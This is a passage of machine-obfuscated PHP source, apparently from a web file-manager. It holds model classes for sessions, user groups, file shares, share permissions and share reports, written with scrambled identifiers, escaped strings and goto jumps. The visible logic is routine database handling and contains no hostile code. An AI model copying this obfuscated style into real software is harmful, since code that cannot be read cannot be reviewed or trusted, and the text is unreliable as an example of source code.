$†‹ì€Ï¡[$˜åõ—[2048]] = $÷„àü«©[$†‹ì€Ï¡[$˜åõ—[1670]]]; } } unset($†‹ì€Ï¡); } public function userAppendGroup($µùÃ£ÙÌ) { $ƒô êØı =& $_SERVER[Îûáû“ş]; if (!$µùÃ£ÙÌ) { return array(); } $this->_listAppendGroup($µùÃ£ÙÌ, array_to_keyvalue($µùÃ£ÙÌ, $ƒô êØı[12], $ƒô êØı[1670])); return $µùÃ£ÙÌ; } private function _listAppendMeta(&$ÌàÔÎ¡ã, $ÒŠ®¬÷¿) { $äÉóÌıù =& $_SERVER[Îûáû“ş]; $¡Œ³™ÙÌ = UserJobModel::JOB_KEY; $Ğ¶ÏŸ€Á = array($äÉóÌıù[2330]); $ëÃõàñ· = array($äÉóÌıù[1670] => array($äÉóÌıù[7], $ÒŠ®¬÷¿)); $ğŒïß—† = Model($äÉóÌıù[2328])->where($ëÃõàñ·)->select(); $ğŒïß—† = array_to_keyvalue_group($ğŒïß—†, $äÉóÌıù[1670]); foreach ($ğŒïß—† as &$ö†ŠƒØ´) { $»àî¦×Ë = array(); foreach ($ö†ŠƒØ´ as $€š•³Î‚) { if (!in_array($€š•³Î‚[$äÉóÌıù[94]], $Ğ¶ÏŸ€Á)) { $»àî¦×Ë[$€š•³Î‚[$äÉóÌıù[94]]] = $€š•³Î‚[$äÉóÌıù[374]]; } } $ö†ŠƒØ´ = $»àî¦×Ë; } unset($ö†ŠƒØ´); $Ñ÷Úİäå = Model($äÉóÌıù[2351]); foreach ($ÌàÔÎ¡ã as &$î†‡ÍÈÅ) { $›ó†ó¦« = array(); if (isset($ğŒïß—†[$î†‡ÍÈÅ[$äÉóÌıù[1670]]])) { $›ó†ó¦« = $ğŒïß—†[$î†‡ÍÈÅ[$äÉóÌıù[1670]]]; } $î†‡ÍÈÅ[$äÉóÌıù[2352]] = array(); if (isset($›ó†ó¦«[$¡Œ³™ÙÌ])) { $î†‡ÍÈÅ[$äÉóÌıù[2352]] = $Ñ÷Úİäå->getUserJobInfo($›ó†ó¦«[$¡Œ³™ÙÌ]); } } unset($î†‡ÍÈÅ); } protected function groupUserAll($şè“Øá°) { $ÅƒÓë¤Š =& $_SERVER[Îûáû“ş]; if (!$şè“Øá°) { return !1; } $¥ûé¹åÀ = Model($ÅƒÓë¤Š[1951])->field($ÅƒÓë¤Š[1670])->where(array($ÅƒÓë¤Š[1861] => array($ÅƒÓë¤Š[7], $şè“Øá°)))->select(); $¥ûé¹åÀ = array_to_keyvalue($¥ûé¹åÀ, $ÅƒÓë¤Š[12], $ÅƒÓë¤Š[1670]); return array_unique($¥ûé¹åÀ); } public function userSearch($¥”£ìæÓ, $÷şôÇ = "\52") { return Model($_SERVER[Îûáû“ş][525])->where($¥”£ìæÓ)->field($÷şôÇ)->find(); } } goto d‘Ìí°ò´; Fİ›ÍÉÈğ‡: class SessionModel extends ModelBase { protected $tableName = "\x73\x79\163\164\145\155\x5f\163\145\163\x73\151\x6f\156"; public function get($Âã¥†œè) { $€ó—ìŠæ =& $_SERVER[Îûáû“ş]; $á£´õìŒ = $this->where(array($€ó—ìŠæ[1996] => $Âã¥†œè))->find(); if (!is_array($á£´õìŒ)) { return !1; } return $á£´õìŒ[$€ó—ìŠæ[753]]; } public function set($ñô®˜Ù, $›ãò³¤Œ, $ô“Û¨Ëå = 3600) { $ğÍšç˜‹ =& $_SERVER[Îûáû“ş]; $…¯Æ”û­ = array($ğÍšç˜‹[1996] => $ñô®˜Ù, $ğÍšç˜‹[1900] => $›ãò³¤Œ, $ğÍšç˜‹[1997] => $ô“Û¨Ëå + time()); if (Session::get($ğÍšç˜‹[1998])) { $…¯Æ”û­[$ğÍšç˜‹[1670]] = Session::get($ğÍšç˜‹[1998]); } else { $…¯Æ”û­[$ğÍšç˜‹[1670]] = 0; } if ($this->get($ñô®˜Ù)) { return $this->where(array($ğÍšç˜‹[1996] => $ñô®˜Ù))->save($…¯Æ”û­); } else { return $this->add($…¯Æ”û­, array(), !0); } } public function remove($ª»š) { return $this->where(array($_SERVER[Îûáû“ş][1996] => $ª»š))->delete(); } public function clearTimeout() { return $this->where($_SERVER[Îûáû“ş][1999] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\x73\150\141\x72\145"; protected $dataAuto = array(array("\x6d\157\144\x69\x66\x79\124\151\155\145", "\x74\151\x6d\145", "\x69\x6e\163\145\162\164\54\x75\160\144\x61\x74\145", "\x66\x75\x6e\143\164\151\157\156"), array("\x63\x72\145\141\x74\x65\x54\151\x6d\x65", "\x74\x69\155\145", "\x69\x6e\163\145\162\164", "\146\x75\x6e\143\x74\x69\x6f\156"), array("\157\x70\164\x69\157\x6e\x73", '', "\x69\x6e\163\145\162\164\54\165\x70\x64\141\164\145\x2c\163\145\154\x65\x63\x74", "\152\x73\x6f\156")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($Í¾²‰×) { $ãşéêÒó =& $_SERVER[Îûáû“ş]; $´šœ¦Ê = isset($Í¾²‰×[0]) ? $Í¾²‰×[0] : !1; return array($ãşéêÒó[2000] => array(USER_ID, $ãşéêÒó[2001]), $ãşéêÒó[1941] => array($´šœ¦Ê, $ãşéêÒó[2002])); } protected function listSimple() { $Ì³ÍÑÙã = array($_SERVER[Îûáû“ş][1670] => USER_ID); $ùí¿š¡œ = $this->field($this->fieldList)->where($Ì³ÍÑÙã)->select(); return $ùí¿š¡œ ? $ùí¿š¡œ : array(); } protected function getInfo($”·…ÇÃ¤, $›ˆ§šÈÃ = false) { $¹•Àñ÷ =& $_SERVER[Îûáû“ş]; if ($›ˆ§šÈÃ) { return $this->_getShareInfo(array($¹•Àñ÷[593] => $”·…ÇÃ¤)); } $ôÆ×ˆÖ× = $this->cacheFunctionGet($¹•Àñ÷[1943], $”·…ÇÃ¤); return $ôÆ×ˆÖ×; } public function getInfoByHash($‹ÛËÆ«‚) { return $this->_getShareInfo(array($_SERVER[Îûáû“ş][2003] => $‹ÛËÆ«‚)); } public function getInfoByPath($Ìßâ¶êù) { $Ç’²’× =& $_SERVER[Îûáû“ş]; $¯«¢ùÉŠ = array($Ç’²’×[1670] => USER_ID, $Ç’²’×[402] => $Ìßâ¶êù); return $this->_getShareInfo($¯«¢ùÉŠ); } public function getInfoBySourcePath($››¸òŒ´) { $€éÎ’ß¹ =& $_SERVER[Îûáû“ş]; $“ÍÆå†ø = array($€éÎ’ß¹[1670] => USER_ID, $€éÎ’ß¹[1177] => $››¸òŒ´); return $this->_getShareInfo($“ÍÆå†ø); } private function _getShareInfo($å–µÔÑ®) { $Ì¸šª¤ =& $_SERVER[Îûáû“ş]; $¿£ä˜¢ = $this->where($å–µÔÑ®)->find(); if (!$¿£ä˜¢) { return !1; } $å–µÔÑ® = array($Ì¸šª¤[593] => $¿£ä˜¢[$Ì¸šª¤[593]]); $•¢Ö¢î = $Ì¸šª¤[2004]; $òÖæ¼Ûê = Model($Ì¸šª¤[594])->order($Ì¸šª¤[399])->field($•¢Ö¢î)->where($å–µÔÑ®)->select(); if ($¿£ä˜¢[$Ì¸šª¤[402]] == $Ì¸šª¤[198]) { $¿£ä˜¢[$Ì¸šª¤[87]] = IO::info($¿£ä˜¢[$Ì¸šª¤[1177]]); } else { $¿£ä˜¢[$Ì¸šª¤[87]] = Model($Ì¸šª¤[1341])->pathInfo($¿£ä˜¢[$Ì¸šª¤[402]]); } $¿£ä˜¢[$Ì¸šª¤[2005]] = $òÖæ¼Ûê; return $¿£ä˜¢; } protected function getInfoAuth($„âŠó‘ä) { $ƒ­„£ì± =& $_SERVER[Îûáû“ş]; $¿†ãßùñ = $this->getInfo($„âŠó‘ä); if ($¿†ãßùñ[$ƒ­„£ì±[1670]] == USER_ID) { $¿†ãßùñ[$ƒ­„£ì±[413]] = $¿†ãßùñ[$ƒ­„£ì±[87]][$ƒ­„£ì±[413]]; } else { $¿†ãßùñ[$ƒ­„£ì±[413]] = Model($ƒ­„£ì±[493])->authMake($¿†ãßùñ[$ƒ­„£ì±[2005]]); } return $¿†ãßùñ; } protected function listData($òü“âá¿ = null, $©Ôè€ŞÓ = 300) { $Å©‡èŞæ =& $_SERVER[Îûáû“ş]; $ÑÛÓôŞÛ = array(array($Å©‡èŞæ[488] => array($Å©‡èŞæ[1014], 0), $Å©‡èŞæ[591] => array($Å©‡èŞæ[1014], 0), $Å©‡èŞæ[2006] => $Å©‡èŞæ[1959])); if ($òü“âá¿ == $Å©‡èŞæ[2007]) { $ÑÛÓôŞÛ = array($Å©‡èŞæ[488] => 1); } else { if ($òü“âá¿ == $Å©‡èŞæ[1163]) { $ÑÛÓôŞÛ = array($Å©‡èŞæ[591] => 1); } } $ÑÛÓôŞÛ[$Å©‡èŞæ[1670]] = USER_ID; $ˆ¨‘Ìë÷ = $this->where($ÑÛÓôŞÛ)->selectPage($©Ôè€ŞÓ); return $ˆ¨‘Ìë÷; } protected function listToMe($â¡Ô±êš = 300) { $ı€Ëõïõ =& $_SERVER[Îûáû“ş]; $¬µìÛµ‰ = Model($ı€Ëõïõ[2008])->userGroupParents(USER_ID); $Œü•â™¾ = array($ı€Ëõïõ[576] => SourceModel::TYPE_USER, $ı€Ëõïõ[496] => USER_ID); if ($¬µìÛµ‰) { $Œü•â™¾ = array(array($ı€Ëõïõ[576] => SourceModel::TYPE_USER, $ı€Ëõïõ[496] => USER_ID), array($ı€Ëõïõ[576] => SourceModel::TYPE_GROUP, $ı€Ëõïõ[496] => array($ı€Ëõïõ[7], $¬µìÛµ‰)), $ı€Ëõïõ[2006] => $ı€Ëõïõ[1959]); } $øÛÏ¥ïÚ = Model($ı€Ëõïõ[594])->where($Œü•â™¾)->selectPage($â¡Ô±êš); $ûë œ—Ì = array_to_keyvalue_group($øÛÏ¥ïÚ[$ı€Ëõïõ[369]], $ı€Ëõïõ[593]); if (!$ûë œ—Ì) { return $øÛÏ¥ïÚ; } $‹åœëÆ = $ı€Ëõïõ[2009]; $Œü•â™¾ = array($ı€Ëõïõ[593] => array($ı€Ëõïõ[418], array_keys($ûë œ—Ì)), $ı€Ëõïõ[1670] => array($ı€Ëõïõ[1016], $ı€Ëõïõ[198])); $´¢‚­Ã· = $this->field($‹åœëÆ)->where($Œü•â™¾)->select(); foreach ($´¢‚­Ã· as $ÒıÈØœ¤ => &$µ²—Êİ¯) { $µ²—Êİ¯[$ı€Ëõïõ[2005]] = $ûë œ—Ì[$µ²—Êİ¯[$ı€Ëõïõ[593]]]; } unset($µ²—Êİ¯); $×ãã·ú¨ = array($ı€Ëõïõ[2010] => $´¢‚­Ã·, $ı€Ëõïõ[2011] => $øÛÏ¥ïÚ[$ı€Ëõïõ[366]]); return $×ãã·ú¨; } protected function shareAdd($²â‘·İ, $é·îÚÛù) { $ó––á¦Š =& $_SERVER[Îûáû“ş]; $È¡ø±Ãé = $this->_addShareData($²â‘·İ, $é·îÚÛù); if (!empty($é·îÚÛù[$ó––á¦Š[2012]])) { $this->_shareAuthSet($È¡ø±Ãé, $é·îÚÛù[$ó––á¦Š[2012]]); } $this->shareEventAdd($²â‘·İ, $é·îÚÛù, $ó––á¦Š[2013]); return $È¡ø±Ãé; } protected function shareAddSystem($ÑÇà»¯», $³çÊª”‰) { $İ—Ÿ¤Æ³ =& $_SERVER[Îûáû“ş]; $¨Œßîé… = $this->_addShareData($ÑÇà»¯», $³çÊª”‰, $İ—Ÿ¤Æ³[1286]); $this->_shareAuthSet($¨Œßîé…, $³çÊª”‰[$İ—Ÿ¤Æ³[2012]]); return $¨Œßîé…; } private function shareEventAdd($ ™ñ§µŸ, $”æ‹ØÊğ, $Í‚«¸Šı = "\141\144\144") { $­Ï™·ÆÂ =& $_SERVER[Îûáû“ş]; if (!$ ™ñ§µŸ || $ ™ñ§µŸ == $­Ï™·ÆÂ[198]) { return; } if ($Í‚«¸Šı == $­Ï™·ÆÂ[2013]) { if ($”æ‹ØÊğ[$­Ï™·ÆÂ[488]] == $­Ï™·ÆÂ[88]) { Model($­Ï™·ÆÂ[561])->eventShare($ ™ñ§µŸ, $­Ï™·ÆÂ[2014]); } if ($”æ‹ØÊğ[$­Ï™·ÆÂ[591]] == $­Ï™·ÆÂ[88]) { Model($­Ï™·ÆÂ[561])->eventShare($ ™ñ§µŸ, $­Ï™·ÆÂ[2015]); } return; } $—˜ú¾¼‹ = $this->getInfoByPath($ ™ñ§µŸ); $À‡‡È× = $­Ï™·ÆÂ[2016]; if ($—˜ú¾¼‹[$­Ï™·ÆÂ[488]] == $­Ï™·ÆÂ[198] && $”æ‹ØÊğ[$­Ï™·ÆÂ[488]] == $­Ï™·ÆÂ[88]) { $À‡‡È× = $­Ï™·ÆÂ[2014]; } if ($—˜ú¾¼‹[$­Ï™·ÆÂ[488]] == $­Ï™·ÆÂ[88] && $”æ‹ØÊğ[$­Ï™·ÆÂ[488]] == $­Ï™·ÆÂ[198]) { $À‡‡È× = $­Ï™·ÆÂ[2017]; } if ($—˜ú¾¼‹[$­Ï™·ÆÂ[591]] == $­Ï™·ÆÂ[198] && $”æ‹ØÊğ[$­Ï™·ÆÂ[591]] == $­Ï™·ÆÂ[88]) { $À‡‡È× = $­Ï™·ÆÂ[2015]; } if ($—˜ú¾¼‹[$­Ï™·ÆÂ[591]] == $­Ï™·ÆÂ[88] && $”æ‹ØÊğ[$­Ï™·ÆÂ[591]] == $­Ï™·ÆÂ[198]) { $À‡‡È× = $­Ï™·ÆÂ[2018]; } Model($­Ï™·ÆÂ[561])->eventShare($ ™ñ§µŸ, $À‡‡È×); return; } private function _addShareData($ùÌÛÁù¿, $³Ê¦³úå = array(), $½å¬á = false) { $ÒÙÊûÊ =& $_SERVER[Îûáû“ş]; $«¡ı = $½å¬á == $ÒÙÊûÊ[1286] ? 0 : USER_ID; $ÉÕŞµÈ‰ = array($ÒÙÊûÊ[417] => $ùÌÛÁù¿, $ÒÙÊûÊ[1661] => $«¡ı); if ($ùÌÛÁù¿ == 0) { $ÉÕŞµÈ‰ = array($ÒÙÊûÊ[2019] => $³Ê¦³úå[$ÒÙÊûÊ[1177]], $ÒÙÊûÊ[1661] => $«¡ı); } if ($Ü›÷ö•¨ = $this->where($ÉÕŞµÈ‰)->find()) { return $Ü›÷ö•¨[$ÒÙÊûÊ[593]]; } if ($ùÌÛÁù¿ == 0) { $ÓÛ¾ úë = array($ÒÙÊûÊ[32] => get_path_this($³Ê¦³úå[$ÒÙÊûÊ[84]])); } else { $ÓÛ¾ úë = Model($ÒÙÊûÊ[824])->sourceInfo($ùÌÛÁù¿); if (!$ÓÛ¾ úë) { return !1; } } if (!$³Ê¦³úå[$ÒÙÊûÊ[1570]]) { $³Ê¦³úå[$ÒÙÊûÊ[1570]] = $ÓÛ¾ úë[$ÒÙÊûÊ[32]]; } $âàÕš”› = array($ÒÙÊûÊ[1661] => $«¡ı, $ÒÙÊûÊ[417] => $ùÌÛÁù¿, $ÒÙÊûÊ[1570] => $ÒÙÊûÊ[12], $ÒÙÊûÊ[488] => 0, $ÒÙÊûÊ[591] => 0, $ÒÙÊûÊ[1177] => $ÒÙÊûÊ[12], $ÒÙÊûÊ[307] => $ÒÙÊûÊ[12], $ÒÙÊûÊ[891] => $ÒÙÊûÊ[12], $ÒÙÊûÊ[2020] => 0, $ÒÙÊûÊ[2021] => 0, $ÒÙÊûÊ[760] => 0, $ÒÙÊûÊ[2022] => $ÒÙÊûÊ[12], $ÒÙÊûÊ[2003] => $ÒÙÊûÊ[12]); $ÂÒè™åº = explode($ÒÙÊûÊ[50], $ÒÙÊûÊ[2023]); foreach ($ÂÒè™åº as $¡ôß˜ìÔ) { if (!isset($³Ê¦³úå[$¡ôß˜ìÔ])) { continue; } $âàÕš”›[$¡ôß˜ìÔ] = $³Ê¦³úå[$¡ôß˜ìÔ]; } $Ú±Œ—…€ = $this->add($âàÕš”›); $æÜ¡Î = array($ÒÙÊûÊ[2003] => short_id($Ú±Œ—…€)); $this->where(array($ÒÙÊûÊ[2024] => $Ú±Œ—…€))->save($æÜ¡Î); return $Ú±Œ—…€; } private function _shareAuthSet($œÙË¨¸², $ˆ Î›Ç) { $æî…¼äğ =& $_SERVER[Îûáû“ş]; if (!is_array($ˆ Î›Ç)) { return !1; } $íê¬îû = Model($æî…¼äğ[1969]); $íê¬îû->where(array($æî…¼äğ[593] => $œÙË¨¸²))->delete(); $÷œ•’ş¦ = array(); foreach ($ˆ Î›Ç as $€¾‡Ğâ) { $Å³‰ƒ‰¤ = SourceModel::TYPE_USER; if ($€¾‡Ğâ[$æî…¼äğ[411]] == SourceModel::TYPE_GROUP) { $Å³‰ƒ‰¤ = SourceModel::TYPE_GROUP; } $¡Ï´å¸ = array($æî…¼äğ[593] => $œÙË¨¸², $æî…¼äğ[411] => $Å³‰ƒ‰¤, $æî…¼äğ[496] => intval($€¾‡Ğâ[$æî…¼äğ[496]]), $æî…¼äğ[1965] => 0, $æî…¼äğ[2025] => -1); if ($€¾‡Ğâ[$æî…¼äğ[1965]]) { $¡Ï´å¸[$æî…¼äğ[1965]] = $€¾‡Ğâ[$æî…¼äğ[1965]]; } else { if ($€¾‡Ğâ[$æî…¼äğ[2025]]) { $¡Ï´å¸[$æî…¼äğ[2025]] = $€¾‡Ğâ[$æî…¼äğ[2025]]; } } $÷œ•’ş¦[] = $¡Ï´å¸; } return $íê¬îû->addAll($÷œ•’ş¦, array(), !0); } public function numViewAdd($İô”¸) { $—Ä‚¿¾Ş =& $_SERVER[Îûáû“ş]; $¼†™ä‚ = array($—Ä‚¿¾Ş[2024] => $İô”¸); $this->where($¼†™ä‚)->setAdd($—Ä‚¿¾Ş[2020]); } public function numDownloadAdd($•í„À³ï) { $—ÜÌ¼® =& $_SERVER[Îûáû“ş]; $ó¾šµ = array($—ÜÌ¼®[2024] => $•í„À³ï); $this->where($ó¾šµ)->setAdd($—ÜÌ¼®[2021]); } protected function shareEdit($·ÎøÏ«’, $ ó…õã) { $º£»Û¹ó =& $_SERVER[Îûáû“ş]; $ê¬Ğ–ˆ = $this->getInfo($·ÎøÏ«’); if (!$ê¬Ğ–ˆ) { return !1; } $this->_checkLinkShare($ ó…õã, $ê¬Ğ–ˆ); $Áë­Ùî = array(); $¾õë˜È¦ = explode($º£»Û¹ó[50], $º£»Û¹ó[2026]); foreach ($¾õë˜È¦ as $ÚôÙåÙƒ) { if (!array_key_exists($ÚôÙåÙƒ, $ ó…õã)) { continue; } $Áë­Ùî[$ÚôÙåÙƒ] = $ ó…õã[$ÚôÙåÙƒ]; } $this->shareEventAdd($ê¬Ğ–ˆ[$º£»Û¹ó[402]], $ ó…õã, $º£»Û¹ó[1831]); $this->where(array($º£»Û¹ó[2024] => $·ÎøÏ«’))->save($Áë­Ùî); if (isset($ ó…õã[$º£»Û¹ó[2012]])) { $this->_shareAuthSet($·ÎøÏ«’, $ ó…õã[$º£»Û¹ó[2012]]); } return !0; } private function _checkLinkShare($œ›¢ÆÜ, $£’üòÛ¼) { $õáäˆˆ =& $_SERVER[Îûáû“ş]; if ($œ›¢ÆÜ[$õáäˆˆ[488]] != $õáäˆˆ[88]) { return; } $ÀºÄ¬·ï = $£’üòÛ¼[$õáäˆˆ[87]][$õáäˆˆ[402]]; if ($£’üòÛ¼[$õáäˆˆ[87]][$õáäˆˆ[33]] != $õáäˆˆ[200]) { $´šÜşë‚ = $this->_folderReport($ÀºÄ¬·ï); if (!$´šÜşë‚) { return; } show_json(LNG($õáäˆˆ[2027]) . $õáäˆˆ[2028] . $´šÜşë‚, !1); } $Í¯øæ¿Ú = Model($õáäˆˆ[824])->fileInfoGet($£’üòÛ¼[$õáäˆˆ[87]][$õáäˆˆ[402]]); if (!$Í¯øæ¿Ú) { return; } $ÑÁüÌ¼ó = $this->shareFileMeta($Í¯øæ¿Ú[$õáäˆˆ[468]]); if (isset($ÑÁüÌ¼ó[$õáäˆˆ[374]]) && $ÑÁüÌ¼ó[$õáäˆˆ[374]] == $õáäˆˆ[88]) { show_json(LNG($õáäˆˆ[2029]), !1); } } private function _folderReport($˜ŒõÀü“) { $ˆİÆÊŠü =& $_SERVER[Îûáû“ş]; $öããÒ»™ = array($ˆİÆÊŠü[468] => array($ˆİÆÊŠü[1014], 0), $ˆİÆÊŠü[748] => 3); $ÒÜ˜Ì¿Ÿ = Model($ˆİÆÊŠü[2030])->where($öããÒ»™)->field($ˆİÆÊŠü[468])->select(); if (!$ÒÜ˜Ì¿Ÿ) { return !1; } $ÒÜ˜Ì¿Ÿ = array_to_keyvalue($ÒÜ˜Ì¿Ÿ, $ˆİÆÊŠü[12], $ˆİÆÊŠü[468]); $Øšõ‚œÈ = $ˆİÆÊŠü[50] . $˜ŒõÀü“ . $ˆİÆÊŠü[50]; $öããÒ»™ = array($ˆİÆÊŠü[468] => array($ˆİÆÊŠü[7], $ÒÜ˜Ì¿Ÿ), $ˆİÆÊŠü[511] => array($ˆİÆÊŠü[383], "\x25{$Øšõ‚œÈ}\x25"), $ˆİÆÊŠü[431] => 0); $¬òş‘Òç = Model($ˆİÆÊŠü[824])->where($öããÒ»™)->field($ˆİÆÊŠü[2031])->find(); if (!$¬òş‘Òç) { return !1; } $–ÁŞö•¼ = substr($¬òş‘Òç[$ˆİÆÊŠü[511]], strpos($¬òş‘Òç[$ˆİÆÊŠü[511]], $Øšõ‚œÈ)); $öããÒ»™ = array($ˆİÆÊŠü[402] => array($ˆİÆÊŠü[7], trim($–ÁŞö•¼, $ˆİÆÊŠü[50]))); $Ü®·‡û = Model($ˆİÆÊŠü[824])->where($öããÒ»™)->field($ˆİÆÊŠü[32])->select(); $ê¿¾ÕÉç = array_to_keyvalue($Ü®·‡û, $ˆİÆÊŠü[12], $ˆİÆÊŠü[32]); $ê¿¾ÕÉç[] = $¬òş‘Òç[$ˆİÆÊŠü[32]]; return implode($ˆİÆÊŠü[8], $ê¿¾ÕÉç); } protected function remove($æå¸Ğãœ) { $‚’’˜êÃ =& $_SERVER[Îûáû“ş]; if (is_array($æå¸Ğãœ)) { $æå¸Ğãœ = array($‚’’˜êÃ[7], $æå¸Ğãœ); } $¿÷è±í = array($‚’’˜êÃ[593] => $æå¸Ğãœ); $ëûÂ…³Î = $this->where($¿÷è±í)->delete(); if ($ëûÂ…³Î) { Model($‚’’˜êÃ[594])->where(array($‚’’˜êÃ[593] => $æå¸Ğãœ))->delete(); } $û”ºïÅµ = is_array($æå¸Ğãœ) ? $æå¸Ğãœ[1] : array($æå¸Ğãœ); for ($ôÔ™Ô•¦ = 0; $ôÔ™Ô•¦ < count($û”ºïÅµ); $ôÔ™Ô•¦++) { $ûõÎ¿¾¸ = $this->getInfo($û”ºïÅµ[$ôÔ™Ô•¦]); if ($ûõÎ¿¾¸[$‚’’˜êÃ[591]] == $‚’’˜êÃ[88]) { Model($‚’’˜êÃ[561])->eventShare($ûõÎ¿¾¸[$‚’’˜êÃ[402]], $‚’’˜êÃ[2018]); } if ($ûõÎ¿¾¸[$‚’’˜êÃ[488]] == $‚’’˜êÃ[88]) { Model($‚’’˜êÃ[561])->eventShare($ûõÎ¿¾¸[$‚’’˜êÃ[402]], $‚’’˜êÃ[2017]); } } return $ëûÂ…³Î; } protected function removeBySource($ó¹‡ùÄ®) { $¹ÙŒ´ÈÑ =& $_SERVER[Îûáû“ş]; $ä£¶ »† = array($¹ÙŒ´ÈÑ[417] => array($¹ÙŒ´ÈÑ[418], $ó¹‡ùÄ®)); $§Ï€‡É¢ = $this->field($¹ÙŒ´ÈÑ[593])->where($ä£¶ »†)->select(); $§Ï€‡É¢ = array_to_keyvalue($§Ï€‡É¢, $¹ÙŒ´ÈÑ[12], $¹ÙŒ´ÈÑ[593]); if (!$§Ï€‡É¢) { return; } $ä£¶ »† = array($¹ÙŒ´ÈÑ[2024] => array($¹ÙŒ´ÈÑ[418], $§Ï€‡É¢)); $this->where($ä£¶ »†)->delete(); Model($¹ÙŒ´ÈÑ[594])->where($ä£¶ »†)->delete(); } public function listAll($–ÇèÆğ) { $·ÚÉş” =& $_SERVER[Îûáû“ş]; $Ú™ÈÂ›Ò = array(); if ($–ÇèÆğ[$·ÚÉş”[1670]]) { $Ú™ÈÂ›Ò[$·ÚÉş”[1670]] = $–ÇèÆğ[$·ÚÉş”[1670]]; } if ($–ÇèÆğ[$·ÚÉş”[759]]) { $³ÕúÒï” = $–ÇèÆğ[$·ÚÉş”[760]] ? $–ÇèÆğ[$·ÚÉş”[760]] : strtotime(date($·ÚÉş”[2032])); $Ú™ÈÂ›Ò[$·ÚÉş”[201]] = array($·ÚÉş”[333], array($–ÇèÆğ[$·ÚÉş”[759]], $³ÕúÒï”)); } if ($–ÇèÆğ[$·ÚÉş”[33]]) { $Ú™ÈÂ›Ò[$–ÇèÆğ[$·ÚÉş”[33]]] = 1; } else { $Ú™ÈÂ›Ò[] = array($·ÚÉş”[488] => array($·ÚÉş”[1014], 0), $·ÚÉş”[591] => array($·ÚÉş”[1014], 0), $·ÚÉş”[2006] => $·ÚÉş”[1959]); } if ($–ÇèÆğ[$·ÚÉş”[1955]]) { $Ú™ÈÂ›Ò[] = array($·ÚÉş”[2003] => $–ÇèÆğ[$·ÚÉş”[1955]], $·ÚÉş”[1570] => array($·ÚÉş”[383], "\45{$–ÇèÆğ[$·ÚÉş”[1955]]}\45"), $·ÚÉş”[2006] => $·ÚÉş”[1959]); } $ªË ôìš = $this->_makeOrder()->where($Ú™ÈÂ›Ò)->selectPage(20); if (empty($ªË ôìš[$·ÚÉş”[369]])) { return array(); } $this->_listDataApply($ªË ôìš[$·ÚÉş”[369]]); return $ªË ôìš; } public function listDataApply($´Ò³ì) { $this->_listDataApply($´Ò³ì); return $´Ò³ì; } private function _listDataApply(&$ÈÙã€§) { $º¹ŠÇÃê =& $_SERVER[Îûáû“ş]; $çë›ûù¤ = array_to_keyvalue($ÈÙã€§, $º¹ŠÇÃê[12], $º¹ŠÇÃê[1670]); $³‚ïˆÏì = Model($º¹ŠÇÃê[525])->userListInfo(array_unique($çë›ûù¤)); $ĞƒÀáëë = array_to_keyvalue($ÈÙã€§, $º¹ŠÇÃê[12], $º¹ŠÇÃê[402]); $“Ô¿¾Ñ­ = Model($º¹ŠÇÃê[824])->sourceListInfo($ĞƒÀáëë, !0); foreach ($ÈÙã€§ as $¼ò“ì½à => &$ã˜õâ) { $Ê‚í°²Ğ = $ã˜õâ[$º¹ŠÇÃê[1670]]; $ã˜õâ[$º¹ŠÇÃê[2033]] = $³‚ïˆÏì[$Ê‚í°²Ğ] ? $³‚ïˆÏì[$Ê‚í°²Ğ] : !1; $™Â¶é…­ = $ã˜õâ[$º¹ŠÇÃê[402]]; $ã˜õâ[$º¹ŠÇÃê[87]] = $“Ô¿¾Ñ­[$™Â¶é…­] ? $“Ô¿¾Ñ­[$™Â¶é…­] : !1; if ($ã˜õâ[$º¹ŠÇÃê[87]][$º¹ŠÇÃê[431]] == $º¹ŠÇÃê[88]) { unset($ÈÙã€§[$¼ò“ì½à]); } if ($ã˜õâ[$º¹ŠÇÃê[87]] != $º¹ŠÇÃê[198] && !$ã˜õâ[$º¹ŠÇÃê[87]]) { unset($ÈÙã€§[$¼ò“ì½à]); } } unset($ã˜õâ); $ÈÙã€§ = array_values($ÈÙã€§); } private function _makeOrder($‚™ßš‹· = '') { $«Ÿ€‚ÇË =& $_SERVER[Îûáû“ş]; $¹™‚½°› = array($«Ÿ€‚ÇË[201], $«Ÿ€‚ÇË[760], $«Ÿ€‚ÇË[2020], $«Ÿ€‚ÇË[2021]); $ç‘˜üÍö = array($«Ÿ€‚ÇË[450] => $«Ÿ€‚ÇË[451], $«Ÿ€‚ÇË[452] => $«Ÿ€‚ÇË[453]); $§´ßì†• = Input::get($«Ÿ€‚ÇË[457], $«Ÿ€‚ÇË[7], $«Ÿ€‚ÇË[423], $¹™‚½°›); $í¶¼èâ½ = Input::get($«Ÿ€‚ÇË[458], $«Ÿ€‚ÇË[7], $«Ÿ€‚ÇË[2034], array($«Ÿ€‚ÇË[1952], $«Ÿ€‚ÇË[452])); $í¶¼èâ½ = $ç‘˜üÍö[$í¶¼èâ½]; $‚™ßš‹· = $‚™ßš‹· . "{$§´ßì†•}\40{$í¶¼èâ½}"; return $this->order($‚™ßš‹·); } public function reportAdd($ß­¢Ù) { $ïìï·¿¡ =& $_SERVER[Îûáû“ş]; $†ìûÄ = array($ïìï·¿¡[593] => $ß­¢Ù[$ïìï·¿¡[593]], $ïìï·¿¡[1670] => USER_ID); if (Model($ïìï·¿¡[2030])->where($†ìûÄ)->find()) { return !1; } $¿£Û˜äŒ = array($ïìï·¿¡[593] => $ß­¢Ù[$ïìï·¿¡[593]], $ïìï·¿¡[1570] => $ß­¢Ù[$ïìï·¿¡[1570]], $ïìï·¿¡[402] => $ß­¢Ù[$ïìï·¿¡[402]], $ïìï·¿¡[468] => $ß­¢Ù[$ïìï·¿¡[468]], $ïìï·¿¡[1670] => USER_ID, $ïìï·¿¡[33] => $ß­¢Ù[$ïìï·¿¡[33]], $ïìï·¿¡[453] => $ß­¢Ù[$ïìï·¿¡[453]]); return Model($ïìï·¿¡[2030])->add($¿£Û˜äŒ); } public function reportList($¬èœ•Å) { $êÄƒ³®Ú =& $_SERVER[Îûáû“ş]; $‘íÈ´ƒß = array(); if ($¬èœ•Å[$êÄƒ³®Ú[759]]) { $ÏÖ‹¦Æ¯ = $¬èœ•Å[$êÄƒ³®Ú[760]] ? $¬èœ•Å[$êÄƒ³®Ú[760]] : strtotime(date($êÄƒ³®Ú[2032])); $‘íÈ´ƒß[$êÄƒ³®Ú[201]] = array($êÄƒ³®Ú[333], array($¬èœ•Å[$êÄƒ³®Ú[759]], $ÏÖ‹¦Æ¯)); } if (isset($¬èœ•Å[$êÄƒ³®Ú[33]]) && 